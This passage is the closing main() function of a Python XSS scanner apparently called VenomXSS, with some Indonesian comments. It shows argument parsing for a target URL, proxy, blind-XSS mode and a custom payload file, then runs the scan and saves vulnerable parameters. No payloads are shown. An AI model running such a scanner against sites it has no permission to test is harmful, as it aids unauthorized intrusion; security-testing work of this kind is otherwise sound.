    parser.add_argument('-b', '--blind', action='store_true', help='Blind XSS mode')
    parser.add_argument('--payloads', help='File payload custom')
    
    args = parser.parse_args()
    
    # Buat scanner
    scanner = VenomXSS(
        target=args.url,
        threads=args.threads,
        timeout=args.timeout,
        proxy=args.proxy,
        verbose=args.verbose,
        blind=args.blind
    )
    
    # Load custom payloads if any
    if args.payloads and os.path.exists(args.payloads):
        with open(args.payloads, 'r') as f:
            custom_payloads = [line.strip() for line in f if line.strip()]
            if custom_payloads:
                global XSS_PAYLOADS
                XSS_PAYLOADS = custom_payloads + XSS_PAYLOADS
                print(f"{GREEN}[✓] Loaded {len(custom_payloads)} custom payloads{RESET}")
    
    try:
        scanner.scan()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Scan dihentikan oleh user{RESET}")
        if scanner.vulnerable_params:
            scanner.save_results()
        sys.exit(0)

if __name__ == "__main__":
    main()
